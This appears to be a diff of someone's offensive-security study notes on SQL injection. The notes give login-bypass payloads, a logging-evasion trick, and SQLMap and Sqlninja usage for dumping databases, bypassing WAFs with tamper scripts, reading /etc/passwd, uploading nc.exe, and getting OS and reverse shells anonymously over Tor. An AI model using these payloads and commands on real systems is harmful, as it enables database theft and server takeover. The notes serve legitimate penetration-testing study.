@@ -2,7 +2,7 @@ SQL Injection:
 =============
 Basics:
 	SQL syntax:
-		verbs:
+		Verbs:
 			SELECT => retrives data
 			INSERT => add data
 			DELETE => remove data
@@ -10,7 +10,7 @@ Basics:
 			DROP => delete data
 			UNION => combines mutiple queries (Q1 UNION Q2)
 			UNION ALL => Unlike "UNION", Union all will not eliminate duplicate rows, instead it just pulls all the rows from all the tables fitting your query specifics and combines them into a table.
-		common terms:
+		Common Terms:
 			WHERE => filters records based on specific conditions
 			AND/OR/NOT => filters records based on multiple conditions
 			ORDER BY => sorts record in ascending/descending order
@@ -23,11 +23,11 @@ Basics:
 			length(string_name)
 			like "<string>%" => checks if provided string present
 			sleep(<number of seconds>) => go to sleep for <number of seconds>
-		other commands:
+		Other Commands:
 			version() or @@version
 			database or database0
 			currentuser()
-		special characters:
+		Special Characters:
 			' and " => string delimeters
 			; => ends SQL statement
 			* and % => wildcards
@@ -37,23 +37,22 @@ Basics:
 			() => calling functions, subqueries, INSERT statements
 			%00 => NullByte
 			Note: 
-	Comments in SQL:
-		Three Types:
-			-- :(aka double-dash comment)
-				It is used to comment the rest of the line.
-				In MySQL, however this operator must be followed by at least one whitespace or control character
-					Example: -- -
-						The last dash basically protects the trailing space.
-					Example: --+
-						Many URL decoders treat + as a space
-			/* comment */ :(Inline comment)
-				If the comment is not closed, an SQL syntax error will be raised.
-				It is less used in SQL injection attacks but it can be useful in some rare cases
-			# :
-				It allows commenting the rest of the line in MySQL. Contrary to the double-dash, it is not necessary to add a space after
+	Comments in SQL:(3)		
+		A. -- :(aka double-dash comment)
+			It is used to comment the rest of the line.
+			In MySQL, however this operator must be followed by at least one whitespace or control character
+				Example: -- -
+					The last dash basically protects the trailing space.
+				Example: --+
+					Many URL decoders treat + as a space
+		B. /* comment */ :(Inline comment)
+			If the comment is not closed, an SQL syntax error will be raised.
+			It is less used in SQL injection attacks but it can be useful in some rare cases
+		C. #
+			It allows commenting the rest of the line in MySQL. Contrary to the double-dash, it is not necessary to add a space after
 	Meta DB:(information_schema)
-		information_schema is a db which is always present as its ANSI standard.
-		it helps us to determine metadata (databases, tables, coloumns) available:
+		Information_schema is a db which is always present as its ANSI standard.
+		It helps us to determine metadata (databases, tables, coloumns) available:
 			MySQL:
 				it shows all the metadata
 				DB => select schema_name from information_schema.schemata
@@ -93,10 +92,10 @@ Manual Testing:
 			website forms (login/signup) (login_bypass)
 			HTTP cookie
 			HTTP user-agent
-	Admin login bypass:
-		payloads to try:(step-1)
-			NOTE:
-				use  this list with burp intruder
+	Admin Login Bypass:
+		Try these payloads:(Step-1)
+			Note:
+				Use  this list with burp intruder
 			*
 			'*'
 			^
@@ -148,7 +147,7 @@ Manual Testing:
 				we can use these payloads in either username or password or both.
 				its possible when used with both username and password, it dont work
 
-			working:
+			Working:
 				UnQuoted:	
 					payload: 1 or 1=1
 					backend:
@@ -159,18 +158,18 @@ Manual Testing:
 					payload: 1' or '1'='1
 					backend:
 						query = SELECT * from user where userid='1' or '1'='1';
-		getting admin access:(step-2)
+		Getting admin access:(step-2)
 			so, step-1 can either give direct admin access or give an error.
 			Error indicates that our parameter is vulnerable to SQLi
 			now, we can use sqlmap:
 				see sqlmap guide, its EASY
-		backend code:(to understand whats happening)
+		Backend code:(to understand whats happening)
 			var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='"+frompwdd+"'"
 			if input is admin:' or 'a'='a:
 				var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='' or 'a'='a' "
 			if input is ' or 1=1 --:xyz:
 				var sql = "SELECT * FROM users where name='' or 'a'='a' -- AND password='xyz'"
-		logging evasion:
+		Logging evasion:
 			when we give some input to a webapp, its logged on the webserver as logs
 			user: ' or 1=1 --sp-password
 			pass: xyz
@@ -439,151 +438,233 @@ Manual Testing:
 		2. Use Burp Repeater instead of directly sending payloads via proxy tab as Repeater will let us use a single request multiple times.
 		3. Always URL-Encode the payload before sending it. 
 			ctrl + u => command to URL-Encode.
-Automated Testing:
-	SQLMAP Guide:(MySQL|MSSQL|ORACLE|POSTGRESQL|SQLITE|more)
-		specifying url:(synatx of "-u")
-			-u aa
-			-u 'aa'
-			-u "aa"
-		using sqlmap on forms(login pages):
+Login Page SQLi Bypass/Test:
+	Manual:
+		Read "Admin Login Bypass" Section under "Manual Testing" Section.
+	Automated:
+		SQLMap:
 			sqlmap -u '' --forms
-		GET parameter:
-			sqlmap -u http://target.com/a.php?id=1 //GET parameter
-		POST parameter:
-			sqlmap -u --data=id=x&pass=pass123
-		REQUEST:(both POST and GET)
-			copy HTTP request from BurpSuite and save it s request.req
-			sqlmap -r request.req
-		to use deadult settings:
-			--batch => this option helps in providing default answers to questions which sqlmap asks throughout the testing
-		Authenciated testing:
-			A. we can use authenicated requests "-r file.req"
-			B. specifying cookie:
-				--cookie="xxxx:xxxx-------"
-		Specifying vulnerable parameter:
-			in REQUEST/POST/GET, we may have more than 1 parameters and sqlmap will take a lot of time to find the vulnerable parameter. So, if we know the vulnerable parameter via recon, we can mention it.
-			sqlmap -u http://target.com/a.php?id=1&s=12 -p id //GET parameter
-			sqlmap -r request.req -p pass
-			sqlmap -u http://target.com/a.php?id=*&s=12 //GET parameter
-				* represents the vulnerable parameter
-		Specifying dbms:
-			sometimes, sqlmap fails to identify the DBMS and we know it by recon
-			sqlmap -u '' --dbms=MySQL
-		Bypassing WAF:
-			Specifying user-agent:
-				--user-agent=xxxx
-				--random-agent => supplies random user-agent
-				Note:
-					default "user-agent" of sqlmap is easily caught by WAFs. So always use user-agent of browser.
-			Specifying referer:
-				--referer=xxxx
-				WAFs also look at referer header to make sure that "flow of website" is in order.
-			Tamper Scripts:
-				General Tamper testing:
-					tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
-				MSSQL:
-					tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2MySQLdash,space2plus,space2randomblank,unionalltounion,unmagicquotes
-				MySQL:
-					tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2MySQLdash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
-				NOTE:
-					to see info a about each of tamper script use this:
-					sqlmap --list-tampers
-		Level and Risk:
-			Levels:(5)
-				1. default
-				2. Adds HTTP "cookie" header testing
-				3. Adds HTTP "user-agent/referer" header testing
-				4.
-				5. Adds HTTP "host" header testing
-				--level=x
-			Risks:(3)
-				1. default/normal
-				2. Medium => Adds testing for "heavy query time-based SQLI"
-				3. Hard => Adds testing for "OR-based SQLI"
-				issue => all risks have possibility of deleting/updating DB
-				--risk=y
-		enumerating DB:
-			--dbs => show databases
-			-D a --tables => show tables
-			-D a -T b --columns => show columns
-			-D a -t b --dump => dump data of table
-			--dump-all => dumps everything
-		DB exploitation:
-			Files:
-				--file-read=/etc/paasswd
-				--file-write "xx" --file-dest "c:/windows":
-					can be used to upload nc.exe
-			--priv-esc => escalate DB privileges
-		Shell:
-			--sql-shell:
-				it allows to do things which we can do in a database interpreter (like MySQL cli). Basically, we can maake changes to the DBMS.
-			--os-shell => gets OS shell by exploiting SQLI
-			--os-cmd=command => runs "command"
-			--os-pwn:
-				select metasploit and PHP as options
-				it will provide a meterpreter shell
-		Advanced Options:
-			TOR:
-				it is completely for anonimity purposes
-				requirement:
-					we need to have TOR installed (apt-get install tor)
-				sqlmap --check-tor => to check if tor is present
-				sqlmap -u '' --tor --tor-type=SOCKS5
-		using proxy:
-			--proxy => requests from sqlmap will pass through proxy aand then will go to target
-			use: helps in analysis of vulnerable paramater
-			we use BurpSuite as proxy
-			sqlmap -u --proxy=http://127.0.0.1:8080		
-	Sqlninja Guide:(MSSQL)
-		flags:
-			-m => attack mode
-				modes:
-					test:(t)
-						Its used in BEGINING to test whether configuration file is correct and whether there is a sql vuln present
-					fingerprint:(f)
-						fingerprintes the remote server
-					bruteforce:(b)
-					escalation:(e)
-					resurrectxp:(x)
-					upload:(u)
-					dirshell:(s)
-					backscan:(k)
-					revshell:(r)
-					dnstunnel:(d)
-					icmpshell:(i)
-					metasploit:(m)
-					sqlcmd:(c)
-						mode to execute commands on shell
+			Note:
+				Read SQLMap section below.
+Automated Testing:
+	SQLMap:
+		Basics:
+			It can be used for exploiting SQLi in MySQL/MSSQL/ORACLE/POSTGRESQL/SQLITE/etc.
+			SQLMap Files:
+				Configuration File:
+					/etc/sqlmap/sqlmap.conf
+				Dump, Log, Output & History Files:
+					~/.local/share/sqlmap/
+		Usage:
+			Specifying Target URL:
+				-u aa
+				-u 'aa'
+				-u "aa"
+			Forums:(Like login/registration/forgot_password)
+				sqlmap -u '' --forms
+				sqlmap -u --data=<>
+			Testing Parameter:
+				Specifying Vulnerable Parameter:(2 Ways)
+					A. Using '*':
+						Just put '*' as value of vulnerable parameter like this:
+							param=*
+					B. Using '-p':
+						sqlmap <flags> -p "parameter"
+				Types:(3)
+					A. GET parameter:
+						sqlmap -u http://target.com/a.php?id=1
+						sqlmap -u http://target.com/a.php?id=1 -p id
+					B. POST parameter:
+						sqlmap -u '<>' --data=<>
+						sqlmap -u '<>' --data=<id=x&pass=pass123>
+					C. REQUEST:(Both POST and GET)
+						sqlmap -r request.req
 						Note:
-							the best way to check if a command is working is by 
-							kali> nc -nvlp 80 (acting as web server)
-							cmd> ping my_ip
-							issue:
-								in case, we are attacking a website, we need our own server to test this
-					getdata:
-			-f => configuration file 
-				file.conf:
-					First line => --httprequest_start--
-					after 1st line:
-						copy the request from burp and paste it, append __SQL2INJECT__ in front of parameter(s) you want to attack
-					Last line => --httprequest_end--
-				example:
-					--httprequest_start--
-					-----burp request-----
-					user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__
-					-----burp request-----
-					--httprequest_end--
-			-p sa_password:
-				sa => user having admin privileges
-				used in escalation mode to add current DB user to the sysadmin group
-				used in other modes to run query as admin
-			-w => wordlist for bruteforce mode
-			-g => in upload mode, it generates debug script and exit
-			-d debug_mode:
-				helps to see the queries used by the tool/requests/responses
-				modes:
-					1 => print each SQL command that is being injected
-					2 => print each HTTP request that is sent to the target
-					3 => print each HTTP response that is received from the target
-					all => all of the above
-		sqlninja -f file.conf -m <mode> <parameters>
+							Grab HTTP request from BurpSuite and save it as request.req
+				Note:
+					In REQUEST/POST/GET, if there are more than 1 parameters or if sqlmap is taking a lot of time to find  vulnerable parameters.
+					Then, if somehow, we know the vulnerable parameters(via recon), then we can mention it by using '*' as follows:
+						sqlmap -u http://target.com/a.php?id=*
+						sqlmap -u '<>' --data=id=*&pass=pass123
+						Put '*' in burp request file, and then use it.
+			Authenciated testing:(2 Ways)
+				A. Using Burp Request:
+					Explained above.
+				B. Using cookies:
+					sqlmap -u http://target.com/a.php?id=1 --cookie="xxxx:xxxx-------"
+			Specifying DBMS Type:
+				Sometimes, SQLMap fails to identify the DBMS type and if we happen to know it, then we can specify it.
+				sqlmap <flags> --dbms=<dbms_type>
+			Enumerating/Dumping DB:
+				--dbs => Show databases
+				-D <db_name> --tables => Show tables in specified DB
+				-D <db_name> -T <table_name> --columns => Show columns in specified table
+				-D <db_name> -T <table_name> --dump => Dumps data of the specified table
+				--dump-all => Dumps everything
+				--hex
+					Use hex conversion during data retrieval. Its used when data retrival causes errors due to some string length restrictions by victim's backend.
+				--output-dir=<> => Custom directory to store dump data and log files.
+				--dump-format=<> => Dump format
+					Types:(3)
+						1. CSV(Default)
+						2. HTML
+						3. SQLITE
+			DB Exploitation:
+				--priv-esc => Escalate DB privileges
+				File Transfer:
+					--file-read=<> => Reads the specified file
+					--file-write "<content>" --file-dest "file_destination" => Writes a file with specified data
+				Shell:
+					--sql-shell => Gives Interactive SQL shell
+					--os-shell => Gives OS shell
+					--os-cmd=command => Executes a command
+					--os-pwn:
+						select metasploit and PHP as options
+						it will provide a meterpreter shell
+			Levels and Risks:
+				They decide how deep to scan & how agressively(risky) scan.
+				Levels:
+					--level=<level_value>
+						Level_value:(5)
+							1. Default
+							2. Adds HTTP "cookie" header testing
+							3. Adds HTTP "user-agent/referer" header testing
+							4. <Couldnt find any info>
+							5. Adds HTTP "host" header testing
+				Risks:
+					--risk=<risk_value>
+						Risk_value:(3)
+							1. Default
+							2. Adds testing for "heavy query time-based SQLI"
+							3. Adds testing for "OR-based SQLI"
+					Note:(Caution)		
+						Increasing risk may increase possibility of deleting/updating DB
+			Bypassing WAF:
+				Specifying user-agent:
+					sqlmap <flags> --user-agent="xxxx" => Uses the specified user-agent
+					sqlmap <flags> --random-agent => Uses a random user-agent
+					Note:
+						Default "user-agent" of sqlmap is easily caught by WAF, so, always use user-agent of browser.
+				Specifying referer:
+					sqlmap <flags> --referer=xxxx
+				Tamper Scripts:
+					sqlmap --list-tampers => List all tamper scripts
+					sqlmap <flags> --tamper=<scripts>
+					Types:(3)
+						A. General Tamper Scripts:
+							tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+						B. MSSQL Tamper Scripts:
+							tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2plus,space2randomblank,unionalltounion,unmagicquotes
+						C. MySQL Tamper Scripts:
+							tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+			Anonimity:
+				Requirement:
+					TOR must be installed in system
+				Pre-Step:
+					Run either of the following command:(2)
+						A. tor => this will start tor service
+						B. service tor start => this will start tor service
+				Ways:(3)
+					A. Using TOR:
+						sqlmap <flags> --check-tor => to check if tor is present
+						sqlmap <flags> --tor --tor-type=SOCKS5
+						--check-tor
+						--tor-port=<> or --tor-port <>
+					B. Using proxy:
+						sqlmap <flags> --proxy=http://127.0.0.1:8080
+					C. Using Proxychains:
+						Requirements:
+							Edit /etc/proxychains.conf:(Setting up proxychains)
+								Append this line:
+									socks5 127.0.0.1 9050
+						proxychains sqlmap <flags>
+			Flags:
+				-u <url> => Target URL
+				--forms => To test login page
+				--data=<> => POST paramater
+				-r <> => Burp request
+				-p <parameter> => To specify vulnerable parameter
+				--batch => Use default options
+				--cookie="<>" => Authenticated testing
+				--risk=x => Set risk
+				--level=x => Set level
+				--list-tampers => List all tamper scripts
+				--tamper=<scripts> => Use tamper scripts
+				--referer=<> =>
+				--random-agent => Uses a random user-agent
+				--user-agent="" => Uses the specified user-agent
+					Best value is "unknown"
+				--dbs => Show databases
+				-D <db_name> => Specify a DB
+				--tables => Show tables in specified DB
+				-T <table_name> => Specify a Table
+				--columns => Show columns in specified table
+				--dump => Dumps data of specified table
+				--dump-all => Dumps everything
+				--hex => Use hex conversion during data retrieval. Its used when data retrival causes errors.
+				--priv-esc => Escalate DB privileges
+				--file-read=<> => Reads the specified file
+				--file-write "<content>" => Writes a file with specified data
+				--file-dest "file_destination" => Writes a file to specified location
+				--sql-shell => Gives Interactive SQL shell
+				--os-shell => Gives OS shell
+				--os-cmd=command => Executes a command
+				--os-pwn =>
+				--tor => Use Tor
+				--check-tor => Checks if Tor is working or not
+				--tor-type=SOCKS5 => To use SOCKS5 Proxy only as SOCKS4 leads to DNS leak
+				--tor-port=<> => To use a port other than default port
+				--proxy=<> => Use proxy
+	Sqlninja:
+		Basics:
+			It can be used for exploiting SQLi in MSSQL.
+		Usage:
+			sqlninja -f <file.conf> -m <mode> <parameters>
+			Flags:
+				-m => attack mode
+					Modes:(14)
+						1. Test:(t)
+							Its used in BEGINING to test whether configuration file is correct and whether there is a sql vuln present
+						2. Fingerprint:(f)
+							Fingerprintes the remote server
+						3. Bruteforce:(b)
+						4. Escalation:(e)
+						5. Resurrectxp:(x)
+						6. Upload:(u)
+						7. Dirshell:(s)
+						8. Backscan:(k)
+						9. Revshell:(r)
+						10. Dnstunnel:(d)
+						11. Icmpshell:(i)
+						12. Metasploit:(m)
+						13. Sqlcmd:(c)
+							Its used to execute commands on shell
+							Note:
+								Best way to check if a command is working is by 
+								kali> nc -nvlp 80 (acting as web server)
+								cmd> ping my_ip
+						14. Getdata:
+				-f <> => Configuration file
+					File.conf:
+						Syntax:
+							First line => --httprequest_start--
+							after 1st line:
+								copy the request from burp and paste it, append __SQL2INJECT__ in front of parameter(s) you want to attack
+							Last line => --httprequest_end--
+						Example:
+							--httprequest_start--
+							-----burp request-----
+							user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__
+							-----burp request-----
+							--httprequest_end--
+				-p <sa_pass>
+					Its used in escalation mode to add current user to sysadmin group or in other modes to run query as admin
+				-w <> => wordlist for bruteforce mode
+				-g => In upload mode, it generates debug script and exit
+				-d <debug_mode>:
+					It helps to see the queries used by the tool/requests/responses.
+					Modes:(4)
+						1. 1 => Print each SQL command that is being injected
+						2. 2 => Print each HTTP request that is sent to the target
+						3. 3 => Print each HTTP response that is received from the target
+						4. all => Print all of the above
